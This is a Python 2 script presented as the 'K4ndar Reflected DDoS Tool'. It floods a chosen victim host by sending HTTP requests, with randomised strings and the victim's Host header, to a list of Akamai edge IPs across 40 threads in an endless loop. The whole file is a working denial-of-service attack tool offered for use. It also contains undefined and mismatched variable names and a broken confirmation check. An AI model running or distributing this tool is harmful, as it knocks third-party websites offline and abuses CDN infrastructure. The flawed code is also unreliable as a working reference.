#!/usr/bin/env python
#
######################################

import threading
import re
import sys
import time
import socket
import string
import random
import hashlib
import Queue

c_g = "\033[1;32m"
c_r = "\033[1;31m"
c_y = "\033[1;33m"
c_e = "\033[0m"

target 		= ""
target_ips 	= []
base_request 	= ""
threads = []
num_threads = 40
VERSION = "v1.0"

def banner():
	print(""" \033[91m
██╗░░██╗░░██╗██╗███╗░░██╗██████╗░░█████╗░██████╗░
██║░██╔╝░██╔╝██║████╗░██║██╔══██╗██╔══██╗██╔══██╗
█████═╝░██╔╝░██║██╔██╗██║██║░░██║███████║██████╔╝
██╔═██╗░███████║██║╚████║██║░░██║██╔══██║██╔══██╗
██║░╚██╗╚════██║██║░╚███║██████╔╝██║░░██║██║░░██║
╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝""")
print("\033[0m")
	print "K4ndar Reflected DDoS Tool\n"
	print "\Telegram User : Kandar24"
	print "  https://github.com/An0nK4ndar"


def usage():
	banner()
	print "Usage: %s -l [file_list] -t [victim_host] -r [request_file] -n [threads (default: 40)] " % sys.argv[0]
	print ""
	exit()

def gen_rand_string():

	charset = string.ascii_letters
	rand_string = ""

	for i in range(1, 15):
		rand_string += str(random.randint(1,999999))
		rand_string += charset[random.randint(0,len(charset)-1)]
	
	return hashlib.md5(rand_string).hexdigest()


class WorkerThread(threading.Thread):
	
	def __init__(self, qin, tid):
		threading.Thread.__init__(self)
		self.qin = qin
		self.tid = tid
		self.kill_received = False
	
	def stop(self):
        	self.kill_recieved = True

	def run(self):
		while not self.kill_received:
			while True:
				try:
					akami_ip = self.qin.get(timeout=1)

				except Queue.Empty:

					print c_y + "[?] " + c_e + "Queue empty, please wait..."
				
				try:
					r = base_request.replace("%RANDOM%", gen_rand_string())
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.settimeout(2)
					s.connect( (akami_ip, 80) )
					s.send(r)
					ret = s.recv(16).strip()
					print c_g + "[Thread '%d' ] Packet => '%s:80' => Response '%s'" % (self.tid, target_ip, ret) + c_e
					s.close()
					self.qin.task_done()
			
				except:
					print c_r + "[!] " + c_e + "Error contacting '%s:80'" % target_ip
					s.close()
				
	
if __name__ == "__main__":

	if "-t" not in sys.argv:
		t_check = False
	else:
		t_check = True

	if "-l" not in sys.argv or "-r" not in sys.argv:
		usage()

	if "-n" in sys.argv:
		num_threads = int(sys.argv[sys.argv.index("-n")+1])

	banner()

	akamai_list 	= sys.argv[sys.argv.index("-l")+1]
	request_f	= sys.argv[sys.argv.index("-r")+1]

	try:
		request_file = open(request_f, "r")
		base_request = request_file.read()
		if "Host: " not in base_request and not t_check:
			print c_r + "[!] " + c_e + "'Host: ' field not found in HTTP(s) request file '%s', either set this manually or use '-t www.target.com' in the command line options" % request_f
			exit()
		elif "Host: " in base_request and not t_check:
			reg = "(Host: .*)"
			target = re.findall(reg, base_request)[0].split(":")[1].strip()

	except:
		print c_r + "[!] " + c_e,
		print "Error opening request file: '%s'." % request_f
		exit()

	try:
		if t_check:
			target = sys.argv[sys.argv.index("-t")+1]
			base_request = base_request.strip() + "\r\nHost: %s\r\n\r\n" % target
					
	except:
		pass

	try:
		akami_file = open(akamai_list, "r")
		for i in akami_file.readlines():
			akamai_ips.append(i.strip())
		
	except:
		print c_r + "[!] " + c_e,
		print "Error opening target list file: '%s'." % target_list
		exit()


	start_time = time.time()

	print c_y + "[?] " + c_e + " Target: '%s'" % target 
	print c_y + "[?] " + c_e + " Request file: '%s'" % request_f 
	print c_y + "[?] " + c_e + " Target EdgeHosts file ('%s' IP's): '%s'" % ( len(target_ips), target_list)
	print c_y + "[?] " + c_e + " Threads '%d'\n" % num_threads
 
	x = raw_input(c_r + "[!] " + c_e + " This is about to perform a reflected DDoS attack with the above settings.\nAre you sure ? [Y/N] ")

	if not (x[:1] == "y") or (x[:1] == "Y"):
		print c_r + "[!] " + c_e + " Exiting..."
		exit()

	while True:
		qin = Queue.Queue()
		try:
			for i in range(0, num_threads):
				worker = WorkerThread(qin, i)
				worker.setDaemon(True)
				worker.daemon = True
				worker.start()
				threads.append(worker)
	
			for ip in akamai_ips:
				qin.put(ip)
		
			qin.join()
	
			print c_g + "[*] " + c_e + "All Target hosts done, re-looping!"
			time.sleep(1)
		
		except KeyboardInterrupt:
			
		        print c_r + "[!] " + c_e + "Ctrl+C Caught! Exiting threads..."
			for t in threads:
				t.stop()
		        sys.exit(0)
